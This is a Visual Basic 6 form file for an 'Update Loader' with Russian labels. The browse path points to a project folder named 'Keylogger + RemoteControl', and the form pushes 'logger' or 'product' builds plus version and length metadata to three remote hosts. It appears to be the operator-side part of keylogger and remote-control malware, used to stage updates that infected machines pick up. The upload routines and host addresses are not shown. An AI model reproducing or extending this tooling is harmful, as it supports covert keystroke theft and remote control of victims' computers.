VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form frmMain 
   Caption         =   "Update Loader"
   ClientHeight    =   5055
   ClientLeft      =   90
   ClientTop       =   420
   ClientWidth     =   4575
   LinkTopic       =   "Form1"
   ScaleHeight     =   5055
   ScaleWidth      =   4575
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox txtWhatsNew 
      Height          =   1935
      Left            =   120
      MultiLine       =   -1  'True
      TabIndex        =   7
      Text            =   "frmMain.frx":0000
      Top             =   3000
      Width           =   4335
   End
   Begin VB.ComboBox cmbList 
      Height          =   315
      ItemData        =   "frmMain.frx":001C
      Left            =   2040
      List            =   "frmMain.frx":0026
      TabIndex        =   6
      Text            =   "Логер"
      Top             =   360
      Width           =   2415
   End
   Begin VB.CommandButton cmdLoad3 
      Caption         =   "3"
      Height          =   495
      Left            =   3240
      TabIndex        =   5
      Top             =   2400
      Width           =   1215
   End
   Begin VB.CommandButton cmdLoad2 
      Caption         =   "2"
      Height          =   495
      Left            =   1800
      TabIndex        =   4
      Top             =   2400
      Width           =   1215
   End
   Begin VB.TextBox txtVer 
      Height          =   285
      Left            =   1680
      TabIndex        =   3
      Text            =   "21"
      Top             =   1920
      Width           =   1215
   End
   Begin VB.CommandButton cmdBrowse 
      Caption         =   "Обзор"
      Height          =   495
      Left            =   1680
      TabIndex        =   2
      Top             =   1320
      Width           =   1215
   End
   Begin MSComDlg.CommonDialog cm 
      Left            =   2040
      Top             =   1320
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.TextBox txtPath 
      Height          =   285
      Left            =   240
      TabIndex        =   1
      Top             =   960
      Width           =   4215
   End
   Begin VB.CommandButton cmdLoad1 
      Caption         =   "Загрузить 1"
      Height          =   495
      Left            =   120
      TabIndex        =   0
      Top             =   2400
      Width           =   1215
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub cmdBrowse_Click()
cm.InitDir = "D:\VB6(NEW)\Кейloger + RеmoteСontrol\Логер"
cm.ShowOpen
txtPath = cm.filename
End Sub

Private Sub cmdLoad1_Click()
HostName = Host1
SetPath
Select Case cmbList.Text
Case "Логер"
    If Upload(txtPath, "log.klrun") And PutFile("log_ver", txtVer, "0292") And PutFile("log_len", Len(ReadFile(txtPath)), "0292") Then Print "Log - Host 1 OK" Else Print "Host 1 Fail"
Case "Продукт"
    If Upload(txtPath, "product.klrun") _
    And PutFile("product_whatsnew", Text2Hex(txtWhatsNew), "0292") _
    And PutFile("product_len", Len(ReadFile(txtPath)), "0292") And _
    PutFile("product_ver", txtVer, "0292") _
    Then Print "Product - Host 1 OK" Else Print "Host 1 Fail"
End Select
End Sub

Private Sub cmdLoad2_Click()
HostName = Host2
SetPath
Select Case cmbList.Text
Case "Логер"
    If Upload(txtPath, "log.klrun") And PutFile("log_ver", txtVer, "0292") And PutFile("log_len", Len(ReadFile(txtPath)), "0292") Then Print "Log - Host 1 OK" Else Print "Host 1 Fail"
Case "Продукт"
    If Upload(txtPath, "product.klrun") _
    And PutFile("product_whatsnew", Text2Hex(txtWhatsNew), "0292") _
    And PutFile("product_len", Len(ReadFile(txtPath)), "0292") And _
    PutFile("product_ver", txtVer, "0292") _
    Then Print "Product - Host 1 OK" Else Print "Host 1 Fail"
End Select
End Sub

Private Sub cmdLoad3_Click()
HostName = Host3
SetPath
Select Case cmbList.Text
Case "Логер"
    If Upload(txtPath, "log.klrun") And PutFile("log_ver", txtVer, "0292") And PutFile("log_len", Len(ReadFile(txtPath)), "0292") Then Print "Log - Host 1 OK" Else Print "Host 1 Fail"
Case "Продукт"
    If Upload(txtPath, "product.klrun") _
    And PutFile("product_whatsnew", Text2Hex(txtWhatsNew), "0292") _
    And PutFile("product_len", Len(ReadFile(txtPath)), "0292") And _
    PutFile("product_ver", txtVer, "0292") _
    Then Print "Product - Host 1 OK" Else Print "Host 1 Fail"
End Select
End Sub
